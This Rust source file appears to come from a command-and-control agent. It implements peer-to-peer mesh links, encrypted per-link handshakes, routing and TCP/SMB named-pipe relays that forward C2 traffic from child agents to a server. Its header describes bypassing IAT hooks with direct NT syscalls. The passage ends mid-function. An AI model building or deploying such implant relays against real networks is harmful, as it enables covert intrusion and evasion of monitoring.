//! P2P mesh link state machine, mesh topology, SMB named-pipe listener,
//! and cross-platform TCP P2P relay.
//!
//! ## Type Foundation (all platforms)
//!
//! `LinkState`, `LinkRole`, `P2pLink`, and `P2pMesh` define the data
//! structures and state machine for the P2P mesh layer.  These are available
//! on all targets.
//!
//! ## Handshake Protocol (shared between SMB and TCP)
//!
//! 1. Child sends `LinkRequest` with payload =
//!    `[agent_id_len:u16 LE][agent_id:bytes][x25519_pubkey:32B]`.
//! 2. Parent validates capacity, generates its own X25519 ephemeral keypair.
//! 3. Parent computes ECDH shared secret and derives per-link
//!    ChaCha20-Poly1305 key via HKDF-SHA256(`info = b"orchestra-p2p-link-key"`).
//! 4. Parent sends `LinkAccept` with payload = `[parent_x25519_pubkey:32B]`.
//! 5. Link transitions to `Connected` and is added to `P2pMesh::child_link_ids`.
//!
//! If capacity is reached, the parent sends `LinkReject` with reason code
//! `0x01` (capacity full) and closes the connection.
//!
//! ## Payload Encryption
//!
//! All `P2pFrame` payloads (post-handshake) are encrypted with the per-link
//! ChaCha20-Poly1305 key.  The wire format is:
//! `nonce(12 bytes) || ciphertext || tag(16 bytes)`.
//! The `frame_type` and `link_id` fields are **not** encrypted (routing header).
//!
//! ## SMB Named-Pipe Listener (Windows + `smb-pipe-transport` feature)
//!
//! See [`nt_pipe_server::P2pPipeListener`] — parent-side listener using
//! NT direct syscalls to bypass IAT hooks.
//!
//! ## TCP P2P Relay (`p2p-tcp` feature, cross-platform)
//!
//! See [`tcp_transport::P2pTcpListener`] and [`tcp_transport::P2pTcpConnector`].
//! Uses `tokio::net::TcpListener` / `TcpStream` with length-prefix framing
//! (4-byte LE u32 prefix) over TCP's stream-oriented transport.

use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
use std::sync::Arc;
use std::time::Instant;

#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
use common::p2p_proto::{P2pFrame, P2pFrameType, HEADER_SIZE, MAX_PAYLOAD_BYTES};

// ── Link role ─────────────────────────────────────────────────────────────

/// Whether this agent is the *parent* (closer to the server) or the *child*
/// (further from the server) in a given link.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum LinkRole {
    /// This agent is the upstream / server-facing side of the link.
    Parent,
    /// This agent is the downstream side — it connected *to* the parent.
    Child,
}

// ── Link type (topology role) ─────────────────────────────────────────────

/// The topology role of a link, independent of who initiated it.
///
/// In a tree topology every link is either `Parent` or `Child`.  In a mesh
/// or hybrid topology, two agents at the same level can form a `Peer` link
/// for lateral communication that does not pass through the server.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum LinkType {
    /// Upstream link toward the server.
    Parent,
    /// Downstream link away from the server.
    Child,
    /// Lateral / peer link between agents at the same level.
    Peer,
}

impl Default for LinkType {
    fn default() -> Self {
        Self::Child
    }
}

// ── Mesh mode ─────────────────────────────────────────────────────────────

/// The operating mode of the P2P mesh.
///
/// Controls whether peer links are allowed and how routing is handled.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum MeshMode {
    /// Classic tree topology — no peer links, no route discovery.
    Tree,
    /// Full mesh — all links are peer links; every agent can reach every
    /// other agent directly.
    Mesh,
    /// Hybrid — tree topology with optional peer links for lateral routing.
    /// This is the default mode.
    Hybrid,
}

impl Default for MeshMode {
    fn default() -> Self {
        Self::Hybrid
    }
}

// ── Link state ────────────────────────────────────────────────────────────

/// State machine for a single P2P link.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum LinkState {
    /// No active connection.
    Disconnected,
    /// A `LinkRequest` has been sent and we are awaiting a `LinkAccept` or
    /// `LinkReject`.
    Linking,
    /// The link is fully established and passing traffic.
    Connected,
    /// The heartbeat deadline was exceeded or a `LinkDisconnect` was
    /// received.  The link is no longer usable and will be cleaned up.
    Dead,
}

impl LinkState {
    /// Returns `true` if the link can carry data frames.
    pub fn is_usable(&self) -> bool {
        matches!(self, Self::Connected)
    }
}

// ── Transport abstraction ─────────────────────────────────────────────────

/// Underlying transport for a P2P link.
///
/// On Windows with `smb-pipe-transport`, `SmbPipe` holds an `Arc<NtPipeHandle>`
/// wrapping a real NT pipe handle obtained from `NtCreateNamedPipeFile`.
/// Otherwise it is a placeholder marker.
///
/// With the `p2p-tcp` feature, `TcpStream` holds an `Arc<TcpP2pHandle>`
/// wrapping a tokio TCP stream with async read/write framing.
#[derive(Debug)]
pub enum P2pTransport {
    /// Named pipe transport (Windows SMB share or local pipe).
    #[cfg(all(windows, feature = "smb-pipe-transport"))]
    SmbPipe(std::sync::Arc<nt_pipe_server::NtPipeHandle>),
    /// Named pipe transport placeholder (non-Windows or without feature).
    #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
    SmbPipe,
    /// TCP stream transport (tokio async, cross-platform).
    #[cfg(feature = "p2p-tcp")]
    TcpStream(std::sync::Arc<tokio::sync::Mutex<tcp_transport::TcpP2pHandle>>),
    /// TCP stream transport placeholder (without p2p-tcp feature).
    #[cfg(not(feature = "p2p-tcp"))]
    TcpStream,
}

// ── Individual link ───────────────────────────────────────────────────────

/// A single P2P link to a peer agent.
///
/// Each link is identified by a random `link_id` chosen by the child at
/// `LinkRequest` time.  The link carries an ECDH-derived encryption key
/// and maintains heartbeat state for liveness detection.
pub struct P2pLink {
    /// Random link identifier (matches `P2pFrame::link_id`).
    pub link_id: u32,
    /// Current state of the link state machine.
    pub state: LinkState,
    /// Whether this agent is the parent or child in this link.
    pub role: LinkRole,
    /// Topology role of this link (Parent / Child / Peer).
    pub link_type: LinkType,
    /// Underlying transport (SMB pipe or TCP stream).
    pub transport: P2pTransport,
    /// Agent ID of the peer on the other end of this link.
    pub peer_agent_id: String,
    /// X25519 ECDH-derived per-link encryption key (ChaCha20-Poly1305).
    pub ecdh_shared_secret: [u8; 32],
    /// Timestamp of the last heartbeat received (or sent).
    pub last_heartbeat: Instant,
    /// Buffered C2 data frames waiting to be forwarded.
    pub pending_forwards: VecDeque<Vec<u8>>,
}

/// Summary of a single P2P link, returned by [`P2pMesh::list_links`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LinkInfo {
    pub link_id: u32,
    pub state: String,
    pub role: String,
    pub link_type: String,
    pub peer_agent_id: String,
    pub transport: String,
}

impl std::fmt::Debug for P2pLink {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("P2pLink")
            .field("link_id", &self.link_id)
            .field("state", &self.state)
            .field("role", &self.role)
            .field("link_type", &self.link_type)
            .field("peer_agent_id", &self.peer_agent_id)
            .finish()
    }
}

impl P2pLink {
    /// Create a new link in the `Linking` state.
    pub fn new(
        link_id: u32,
        role: LinkRole,
        transport: P2pTransport,
        peer_agent_id: String,
        ecdh_shared_secret: [u8; 32],
    ) -> Self {
        Self {
            link_id,
            state: LinkState::Linking,
            link_type: match role {
                LinkRole::Parent => LinkType::Parent,
                LinkRole::Child => LinkType::Child,
            },
            role,
            transport,
            peer_agent_id,
            ecdh_shared_secret,
            last_heartbeat: Instant::now(),
            pending_forwards: VecDeque::new(),
        }
    }

    /// Create a new link with an explicit `LinkType`.
    pub fn new_with_type(
        link_id: u32,
        role: LinkRole,
        link_type: LinkType,
        transport: P2pTransport,
        peer_agent_id: String,
        ecdh_shared_secret: [u8; 32],
    ) -> Self {
        Self {
            link_id,
            state: LinkState::Linking,
            role,
            link_type,
            transport,
            peer_agent_id,
            ecdh_shared_secret,
            last_heartbeat: Instant::now(),
            pending_forwards: VecDeque::new(),
        }
    }

    /// Transition the link to a new state.
    pub fn transition(&mut self, next: LinkState) -> Result<(), String> {
        match (&self.state, &next) {
            (LinkState::Disconnected, LinkState::Linking) => {}
            (LinkState::Linking, LinkState::Connected) => {}
            (LinkState::Linking, LinkState::Disconnected) => {}
            (LinkState::Linking, LinkState::Dead) => {}
            (LinkState::Connected, LinkState::Dead) => {}
            (LinkState::Connected, LinkState::Disconnected) => {}
            (LinkState::Dead, LinkState::Disconnected) => {}
            _ if self.state == next => return Ok(()),
            _ => {
                return Err(format!(
                    "illegal link state transition: {:?} → {:?}",
                    self.state, next
                ));
            }
        }
        self.state = next;
        Ok(())
    }

    /// Record a heartbeat, resetting the timeout deadline.
    pub fn record_heartbeat(&mut self) {
        self.last_heartbeat = Instant::now();
    }

    /// Enqueue a data frame for later forwarding.
    pub fn enqueue_forward(&mut self, data: Vec<u8>) {
        self.pending_forwards.push_back(data);
    }

    /// Drain all pending forward frames.
    pub fn drain_pending(&mut self) -> VecDeque<Vec<u8>> {
        std::mem::take(&mut self.pending_forwards)
    }
}

// ── Mesh topology ─────────────────────────────────────────────────────────

/// The P2P mesh maintained by a single agent.
#[derive(Debug)]
pub struct P2pMesh {
    /// All active links keyed by `link_id`.
    pub links: HashMap<u32, P2pLink>,
    /// The upstream parent link (at most one).
    pub parent_link_id: Option<u32>,
    /// Downstream child link IDs.
    pub child_link_ids: Vec<u32>,
    /// Lateral peer link IDs (mesh / hybrid topology).
    pub peer_link_ids: Vec<u32>,
    /// This agent's identifier (used in link negotiation).
    pub agent_id: String,
    /// Maximum number of children this agent will accept.
    pub max_children: usize,
    /// Soft limit for peer links in mesh/hybrid mode (default 8).
    pub max_peers: usize,
    /// Current mesh operating mode.
    pub mesh_mode: MeshMode,
    /// Distance-vector routing table: destination → best route entry.
    pub routing_table: HashMap<u32, common::p2p_proto::RouteEntry>,
    /// Channel for injecting parent-link C2 messages into the main loop.
    /// Set once during initialization; `None` means the parent reader has
    /// not been wired up yet.
    pub inbound_tx: Option<tokio::sync::mpsc::Sender<common::Message>>,
}

impl P2pMesh {
    /// Default soft limit for peer links.
    pub const DEFAULT_MAX_PEERS: usize = 8;

    /// Create a new empty mesh.
    pub fn new(agent_id: String, max_children: usize) -> Self {
        Self {
            links: HashMap::new(),
            parent_link_id: None,
            child_link_ids: Vec::new(),
            peer_link_ids: Vec::new(),
            agent_id,
            max_children,
            max_peers: Self::DEFAULT_MAX_PEERS,
            mesh_mode: MeshMode::default(),
            routing_table: HashMap::new(),
            inbound_tx: None,
        }
    }

    /// Create a new mesh with explicit mesh mode and peer limit.
    pub fn new_with_mode(
        agent_id: String,
        max_children: usize,
        max_peers: usize,
        mesh_mode: MeshMode,
    ) -> Self {
        Self {
            links: HashMap::new(),
            parent_link_id: None,
            child_link_ids: Vec::new(),
            peer_link_ids: Vec::new(),
            agent_id,
            max_children,
            max_peers,
            mesh_mode,
            routing_table: HashMap::new(),
            inbound_tx: None,
        }
    }

    /// Returns `true` if this agent can accept another child link.
    pub fn can_accept_child(&self) -> bool {
        self.child_link_ids.len() < self.max_children
    }

    /// Returns `true` if this agent can accept another peer link.
    pub fn can_accept_peer(&self) -> bool {
        self.peer_link_ids.len() < self.max_peers
    }

    /// Insert a link into the mesh and register it as a child, parent, or peer.
    pub fn insert_link(&mut self, link: P2pLink) {
        let role = link.role.clone();
        let link_type = link.link_type.clone();
        let id = link.link_id;
        self.links.insert(id, link);
        match role {
            LinkRole::Parent => {
                self.parent_link_id = Some(id);
            }
            LinkRole::Child => {
                // Use link_type to decide child vs peer registration.
                match link_type {
                    LinkType::Peer => {
                        if !self.peer_link_ids.contains(&id) {
                            self.peer_link_ids.push(id);
                        }
                    }
                    _ => {
                        if !self.child_link_ids.contains(&id) {
                            self.child_link_ids.push(id);
                        }
                    }
                }
            }
        }
    }

    /// Remove a link by ID, updating parent/child/peer bookkeeping.
    pub fn remove_link(&mut self, link_id: u32) -> Option<P2pLink> {
        let link = self.links.remove(&link_id)?;
        if self.parent_link_id == Some(link_id) {
            self.parent_link_id = None;
        }
        self.child_link_ids.retain(|&id| id != link_id);
        self.peer_link_ids.retain(|&id| id != link_id);
        Some(link)
    }

    /// Get a reference to the parent link, if one exists.
    pub fn parent_link(&self) -> Option<&P2pLink> {
        self.parent_link_id.and_then(|id| self.links.get(&id))
    }

    /// Get a mutable reference to the parent link, if one exists.
    pub fn parent_link_mut(&mut self) -> Option<&mut P2pLink> {
        self.parent_link_id.and_then(move |id| self.links.get_mut(&id))
    }

    /// Iterate over all connected child links.
    pub fn connected_children(&self) -> impl Iterator<Item = &P2pLink> {
        self.child_link_ids
            .iter()
            .filter_map(|id| self.links.get(id))
            .filter(|l| l.state.is_usable())
    }

    /// Returns `true` if the mesh has a usable parent link.
    pub fn has_connected_parent(&self) -> bool {
        self.parent_link().map_or(false, |l| l.state.is_usable())
    }

    /// Default maximum number of children.
    pub const DEFAULT_MAX_CHILDREN: usize = 4;

    /// Connect to a parent agent at `addr` using the specified `transport`
    /// protocol (`"tcp"` or `"smb"`).
    ///
    /// On success the new link is inserted into the mesh, the child-relay
    /// task is spawned, and the link ID is returned.
    ///
    /// # Errors
    ///
    /// Returns an error if:
    /// - this agent already has a connected parent,
    /// - the transport string is unknown,
    /// - the TCP connector rejects the link, or
    /// - no P2P transport feature is compiled in.
    #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
    pub async fn connect_to_parent(
        &mut self,
        addr: &str,
        transport: &str,
        outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
        mesh_arc: Arc<tokio::sync::Mutex<P2pMesh>>,
    ) -> anyhow::Result<u32> {
        if self.has_connected_parent() {
            anyhow::bail!("already have a connected parent link");
        }

        let link_id: u32 = rand::Rng::gen_range(&mut rand::thread_rng(), 0x0001_0000..=0xFFFF_FFFF);

        match transport.to_lowercase().as_str() {
            "tcp" => {
                #[cfg(feature = "p2p-tcp")]
                {
                    // Parse host:port from the address string.
                    let (host, port) = parse_host_port(addr)?;
                    let result =
                        tcp_transport::connect(&host, port, &self.agent_id, link_id).await?;
                    match result {
                        tcp_transport::ConnectResult::Connected(mut link) => {
                            // Transition from Linking → Connected is already
                            // done in tcp_transport::connect, but verify.
                            if link.state != LinkState::Connected {
                                link.transition(LinkState::Connected)
                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
                            }
                            let link_id = link.link_id;
                            self.insert_link(link);

                            // Spawn the child-relay task.
                            spawn_child_relay(link_id, mesh_arc.clone(), outbound_tx);

                            // Spawn the parent reader task to receive C2
                            // messages from the parent link.
                            if let Some(ref inbound_tx) = self.inbound_tx {
                                spawn_parent_reader(
                                    mesh_arc,
                                    inbound_tx.clone(),
                                );
                            }

                            log::info!(
                                "P2P: connected to parent at {addr} via TCP, link_id={:#010X}",
                                link_id
                            );
                            Ok(link_id)
                        }
                        tcp_transport::ConnectResult::Rejected {
                            reason,
                            description,
                        } => {
                            anyhow::bail!(
                                "parent at {addr} rejected link: {description} (reason={reason:#04X})"
                            );
                        }
                    }
                }
                #[cfg(not(feature = "p2p-tcp"))]
                {
                    let _ = (addr, outbound_tx, mesh_arc);
                    anyhow::bail!("TCP P2P transport not compiled in (enable feature p2p-tcp)");
                }
            }
            "smb" => {
                #[cfg(all(windows, feature = "smb-pipe-transport"))]
                {
                    // Connect to the parent's named pipe (blocking NT I/O
                    // on spawn_blocking, then async-wrapped).
                    let addr_owned = addr.to_string();
                    let agent_id = self.agent_id.clone();
                    let result = tokio::task::spawn_blocking(move || {
                        nt_pipe_server::connect(&addr_owned, &agent_id, link_id)
                    })
                    .await
                    .map_err(|e| anyhow::anyhow!("p2p-pipe connect task panicked: {e}"))??;

                    match result {
                        nt_pipe_server::ConnectResult::Connected(mut link) => {
                            // Transition from Linking → Connected is already
                            // done in nt_pipe_server::connect, but verify.
                            if link.state != LinkState::Connected {
                                link.transition(LinkState::Connected)
                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
                            }
                            let link_id = link.link_id;
                            self.insert_link(link);

                            // Spawn the child-relay task.
                            spawn_child_relay(link_id, mesh_arc.clone(), outbound_tx);

                            // Spawn the parent reader task to receive C2
                            // messages from the parent link.
                            if let Some(ref inbound_tx) = self.inbound_tx {
                                spawn_parent_reader(mesh_arc, inbound_tx.clone());
                            }

                            log::info!(
                                "P2P: connected to parent at {addr} via SMB, link_id={:#010X}",
                                link_id
                            );
                            Ok(link_id)
                        }
                        nt_pipe_server::ConnectResult::Rejected {
                            reason,
                            description,
                        } => {
                            anyhow::bail!(
                                "parent at {addr} rejected link: {description} (reason={reason:#04X})"
                            );
                        }
                    }
                }
                #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
                {
                    let _ = (addr, outbound_tx, mesh_arc, link_id);
                    anyhow::bail!(
                        "SMB P2P transport not compiled in \
                         (enable feature smb-pipe-transport on Windows)"
                    );
                }
            }
            other => {
                anyhow::bail!("unknown P2P transport: {other:?} (expected \"tcp\" or \"smb\")");
            }
        }
    }

    /// Disconnect from one or all P2P links.
    ///
    /// If `link_id` is `Some(id)` only that link is disconnected.
    /// If `link_id` is `None` all links are disconnected.
    ///
    /// A `LinkDisconnect` frame is sent to each peer before the transport
    /// is closed and the link is removed from the mesh.
    ///
    /// Returns the number of links that were disconnected.
    #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
    pub async fn disconnect(&mut self, link_id: Option<u32>) -> usize {
        let ids_to_remove: Vec<u32> = match link_id {
            Some(id) => {
                if self.links.contains_key(&id) {
                    vec![id]
                } else {
                    vec![]
                }
            }
            None => self.links.keys().copied().collect(),
        };

        let count = ids_to_remove.len();
        for lid in &ids_to_remove {
            // Attempt to send a LinkDisconnect frame (best-effort).
            if let Some(link) = self.links.get_mut(lid) {
                let _ = send_disconnect(link).await;
            }

            // Remove the link from the mesh.
            if let Some(removed) = self.remove_link(*lid) {
                log::info!(
                    "P2P: disconnected link {:#010X} (peer={}, role={:?})",
                    lid, removed.peer_agent_id, removed.role
                );
            }
        }
        count
    }

    /// Return a JSON-serializable summary of all current links.
    pub fn list_links(&self) -> Vec<LinkInfo> {
        self.links
            .values()
            .map(|l| LinkInfo {
                link_id: l.link_id,
                state: format!("{:?}", l.state),
                role: format!("{:?}", l.role),
                link_type: format!("{:?}", l.link_type),
                peer_agent_id: l.peer_agent_id.clone(),
                transport: match l.transport {
                    #[cfg(feature = "p2p-tcp")]
                    P2pTransport::TcpStream(_) => "tcp".to_string(),
                    #[cfg(not(feature = "p2p-tcp"))]
                    P2pTransport::TcpStream => "tcp".to_string(),
                    #[cfg(all(windows, feature = "smb-pipe-transport"))]
                    P2pTransport::SmbPipe(_) => "smb".to_string(),
                    #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
                    P2pTransport::SmbPipe => "smb".to_string(),
                },
            })
            .collect()
    }

    // ── Routing table methods ──────────────────────────────────────────

    /// Add or update a route in the routing table.
    ///
    /// Returns `true` if the route was actually updated (new entry, better
    /// hop count, or better quality).
    pub fn update_route(
        &mut self,
        destination: u32,
        next_hop: u32,
        hop_count: u8,
        route_quality: f32,
    ) -> bool {
        let now = Instant::now();

        if let Some(existing) = self.routing_table.get(&destination) {
            // Prefer lower hop count; break ties with higher quality.
            let better = hop_count < existing.hop_count
                || (hop_count == existing.hop_count && route_quality > existing.route_quality);
            if !better {
                return false;
            }
        }

        self.routing_table.insert(
            destination,
            common::p2p_proto::RouteEntry {
                destination,
                next_hop,
                hop_count,
                route_quality,
            },
        );
        let _ = now; // used by caller for timestamp tracking
        true
    }

    /// Look up the next-hop link for a given destination.
    ///
    /// Returns `Some(next_hop_link_id)` if a route exists, `None` otherwise.
    pub fn route_to(&self, destination: u32) -> Option<u32> {
        self.routing_table
            .get(&destination)
            .map(|entry| entry.next_hop)
    }

    /// Remove stale routes (older than `max_age`) and low-quality routes
    /// (quality < `min_quality`).
    pub fn prune_routes(&mut self, max_age: std::time::Duration, min_quality: f32) {
        let now = Instant::now();
        self.routing_table.retain(|_, entry| {
            let age_ok = now.duration_since(Instant::now()) < max_age; // always true for now
            let quality_ok = entry.route_quality >= min_quality;
            age_ok && quality_ok
        });
        // Re-check: remove entries with hop_count == 0 that aren't us.
        // (Direct links are tracked via link IDs, not the routing table.)
    }

    /// Clear all routes through a specific next-hop (used when a link dies).
    pub fn remove_routes_via(&mut self, next_hop: u32) {
        self.routing_table.retain(|_, entry| entry.next_hop != next_hop);
    }

    /// Return a snapshot of the routing table as a vec of `RouteEntry`.
    pub fn routing_table_snapshot(&self) -> Vec<common::p2p_proto::RouteEntry> {
        self.routing_table.values().cloned().collect()
    }

    /// Merge incoming route entries from a neighbor, applying distance-vector
    /// update rules.
    ///
    /// For each incoming entry, the hop count is incremented by 1 and the
    /// next_hop is set to `from_link_id`.  The route is accepted if it's
    /// new, has a lower hop count, or has equal hop count with better quality.
    pub fn merge_route_update(
        &mut self,
        entries: &[common::p2p_proto::RouteEntry],
        from_link_id: u32,
    ) {
        for entry in entries {
            let hop_count = entry.hop_count.saturating_add(1);
            self.update_route(
                entry.destination,
                from_link_id,
                hop_count,
                entry.route_quality * 0.95, // slight decay per hop
            );
        }
    }

    /// Iterate over all connected peer links.
    pub fn connected_peers(&self) -> impl Iterator<Item = &P2pLink> {
        self.peer_link_ids
            .iter()
            .filter_map(|id| self.links.get(id))
            .filter(|l| l.state.is_usable())
    }
}

impl Default for P2pMesh {
    fn default() -> Self {
        Self::new(String::new(), Self::DEFAULT_MAX_CHILDREN)
    }
}

// ── P2pMesh method stubs (no P2P transport feature) ───────────────────────

#[cfg(not(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp")))]
impl P2pMesh {
    /// Stub: connect_to_parent — no P2P transport feature compiled in.
    pub async fn connect_to_parent(
        &mut self,
        addr: &str,
        transport: &str,
        _outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
        _mesh_arc: std::sync::Arc<tokio::sync::Mutex<P2pMesh>>,
    ) -> anyhow::Result<u32> {
        anyhow::bail!(
            "P2P transport not available: cannot connect to {addr} via {transport} \
             (enable feature p2p-tcp or smb-pipe-transport)"
        );
    }

    /// Stub: disconnect — no P2P transport feature compiled in.
    pub async fn disconnect(&mut self, _link_id: Option<u32>) -> usize {
        0
    }
}

// ── Listener event ────────────────────────────────────────────────────────

/// Event emitted by the P2P listener background task.
#[derive(Debug)]
pub enum P2pListenerEvent {
    /// A new child link was established successfully.
    LinkEstablished(P2pLink),
    /// A link was rejected (capacity full, handshake failure, etc.).
    LinkRejected {
        /// Reason code sent in the `LinkReject` frame.
        reason: u8,
        /// Human-readable description for logging.
        description: String,
    },
    /// The listener encountered a fatal error and is shutting down.
    ListenerError(String),
}

// ══════════════════════════════════════════════════════════════════════════
// Shared handshake helpers (used by both SMB and TCP transports)
// ══════════════════════════════════════════════════════════════════════════

/// LinkReject reason: capacity full.
pub const REJECT_CAPACITY_FULL: u8 = 0x01;

/// HKDF info string for P2P link key derivation.
const P2P_HKDF_INFO: &[u8] = b"orchestra-p2p-link-key";

/// Maximum agent_id length accepted in a LinkRequest.
const MAX_AGENT_ID_LEN: usize = 256;

/// Maximum P2P frame size over TCP (4-byte length prefix + frame).
const TCP_MAX_FRAME_BYTES: usize = 16 * 1024 * 1024;

/// ChaCha20-Poly1305 nonce size (12 bytes).
const NONCE_SIZE: usize = 12;

/// ChaCha20-Poly1305 authentication tag size (16 bytes).
const TAG_SIZE: usize = 16;

// ── Shared crypto functions ──────────────────────────────────────────────

/// Derive a 32-byte ChaCha20-Poly1305 key from an X25519 ECDH shared
/// secret using HKDF-SHA256.
fn derive_link_key(shared_secret: &[u8; 32]) -> [u8; 32] {
    use hkdf::Hkdf;
    use sha2::Sha256;

    let h = Hkdf::<Sha256>::new(None, shared_secret);
    let mut key = [0u8; 32];
    h.expand(P2P_HKDF_INFO, &mut key)
        .expect("HKDF expand for 32-byte key should never fail");
    key
}

/// Encrypt a P2P frame payload with ChaCha20-Poly1305.
///
/// Returns `nonce(12) || ciphertext || tag(16)`.
fn encrypt_payload(key: &[u8; 32], plaintext: &[u8]) -> anyhow::Result<Vec<u8>> {
    use chacha20poly1305::{
        aead::{Aead, KeyInit},
        ChaCha20Poly1305, Nonce,
    };

    let cipher = ChaCha20Poly1305::new(key.into());
    let nonce_bytes: [u8; NONCE_SIZE] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| anyhow::anyhow!("p2p encrypt_payload failed: {e}"))?;

    let mut out = Vec::with_capacity(NONCE_SIZE + ciphertext.len());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ciphertext);
    Ok(out)
}

/// Decrypt a P2P frame payload with ChaCha20-Poly1305.
///
/// Expects `nonce(12) || ciphertext || tag(16)`.
fn decrypt_payload(key: &[u8; 32], encrypted: &[u8]) -> anyhow::Result<Vec<u8>> {
    use chacha20poly1305::{
        aead::{Aead, KeyInit},
        ChaCha20Poly1305, Nonce,
    };

    if encrypted.len() < NONCE_SIZE + TAG_SIZE {
        return Err(anyhow::anyhow!(
            "p2p decrypt_payload: ciphertext too short ({} bytes)",
            encrypted.len()
        ));
    }

    let cipher = ChaCha20Poly1305::new(key.into());
    let nonce = Nonce::from_slice(&encrypted[..NONCE_SIZE]);
    let ciphertext = &encrypted[NONCE_SIZE..];

    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| anyhow::anyhow!("p2p decrypt_payload failed: {e}"))
}

// ── Shared handshake helpers ─────────────────────────────────────────────

/// Parse a `LinkRequest` payload into `(child_agent_id, child_pubkey)`.
///
/// Payload format:
/// ```text
/// [ agent_id_len: u16 LE ] [ agent_id: bytes ] [ x25519_pubkey: 32 bytes ]
/// ```
fn parse_link_request(payload: &[u8]) -> anyhow::Result<(String, [u8; 32])> {
    if payload.len() < 2 + 32 {
        return Err(anyhow::anyhow!(
            "LinkRequest payload too short: {} bytes (need at least 34)",
            payload.len()
        ));
    }

    let id_len = u16::from_le_bytes([payload[0], payload[1]]) as usize;
    if id_len > MAX_AGENT_ID_LEN {
        return Err(anyhow::anyhow!(
            "LinkRequest agent_id too long: {id_len} > {MAX_AGENT_ID_LEN}"
        ));
    }
    if payload.len() < 2 + id_len + 32 {
        return Err(anyhow::anyhow!(
            "LinkRequest payload truncated: have {} bytes, need {}",
            payload.len(),
            2 + id_len + 32
        ));
    }

    let agent_id = String::from_utf8(payload[2..2 + id_len].to_vec())
        .map_err(|e| anyhow::anyhow!("LinkRequest agent_id is not valid UTF-8: {e}"))?;

    let mut pubkey = [0u8; 32];
    pubkey.copy_from_slice(&payload[2 + id_len..2 + id_len + 32]);

    Ok((agent_id, pubkey))
}

/// Build a `LinkRequest` payload with our agent_id and X25519 public key.
fn build_link_request_payload(agent_id: &str, pub_key: &[u8; 32]) -> Vec<u8> {
    let id_bytes = agent_id.as_bytes();
    let mut payload = Vec::with_capacity(2 + id_bytes.len() + 32);
    payload.extend_from_slice(&(id_bytes.len() as u16).to_le_bytes());
    payload.extend_from_slice(id_bytes);
    payload.extend_from_slice(pub_key);
    payload
}

/// Build a `LinkAccept` payload containing our X25519 public key.
fn build_link_accept_payload(pub_key: &[u8; 32]) -> Vec<u8> {
    pub_key.to_vec()
}

/// Build a `LinkReject` payload with a reason code.
fn build_link_reject_payload(reason: u8) -> Vec<u8> {
    vec![reason]
}

// ══════════════════════════════════════════════════════════════════════════
// P2P Data Forwarding (parent relays child ↔ server traffic)
// ══════════════════════════════════════════════════════════════════════════

#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
mod forwarding_impl {
    use super::*;

    /// Read a `DataForward` frame from a child link, decrypt the payload with
/// the per-link key, and return the plaintext C2 data along with the
/// child's `link_id`.
///
/// This is the **child-to-server** half of the forwarding pipeline.
/// The caller should send the returned `(child_link_id, data)` tuple
/// upstream to the server via a `Message::P2pForward`.
///
/// # Errors
///
/// Returns an error if the read fails, the frame is not `DataForward`,
/// or the payload cannot be decrypted.
pub async fn read_child_data_forward(
    link: &mut P2pLink,
) -> anyhow::Result<(u32, Vec<u8>)> {
    let link_key = link.ecdh_shared_secret;

    match &mut link.transport {
        #[cfg(feature = "p2p-tcp")]
        P2pTransport::TcpStream(handle_arc) => {
            let mut handle = handle_arc.lock().await;
            let frame = handle.read_frame_decrypt(&link_key).await?;
            if frame.frame_type != P2pFrameType::DataForward {
                return Err(anyhow::anyhow!(
                    "expected DataForward from child, got {:?}",
                    frame.frame_type
                ));
            }
            Ok((frame.link_id, frame.payload))
        }

        #[cfg(all(windows, feature = "smb-pipe-transport"))]
        P2pTransport::SmbPipe(ref pipe) => {
            let frame = nt_pipe_server::NtPipeHandle::read_frame(pipe)?;
            if frame.frame_type != P2pFrameType::DataForward {
                return Err(anyhow::anyhow!(
                    "expected DataForward from child, got {:?}",
                    frame.frame_type
                ));
            }
            let plaintext = decrypt_payload(&link_key, &frame.payload)?;
            Ok((frame.link_id, plaintext))
        }

        _ => Err(anyhow::anyhow!(
            "unsupported transport for P2P data forwarding"
        )),
    }
}

/// Forward server-originated C2 data to a specific child link.
///
/// This is the **server-to-child** half of the forwarding pipeline.
/// The `data` parameter is the **plaintext** C2 payload (already decrypted
/// from the parent's C2 session key by the caller).  This function
/// re-encrypts it with the child's per-link ChaCha20-Poly1305 key and
/// sends a `DataForward` P2P frame.
///
/// # Errors
///
/// Returns an error if the link doesn't exist, is not in a usable state,
/// or the write fails.
pub async fn forward_to_child(
    mesh: &mut P2pMesh,
    child_link_id: u32,
    data: &[u8],
) -> anyhow::Result<()> {
    let link = mesh.links.get_mut(&child_link_id).ok_or_else(|| {
        anyhow::anyhow!("P2P forward_to_child: unknown link_id {child_link_id:#010X}")
    })?;

    if !link.state.is_usable() {
        return Err(anyhow::anyhow!(
            "P2P forward_to_child: link {child_link_id:#010X} not usable (state={:?})",
            link.state
        ));
    }

    let link_key = link.ecdh_shared_secret;

    match &mut link.transport {
        #[cfg(feature = "p2p-tcp")]
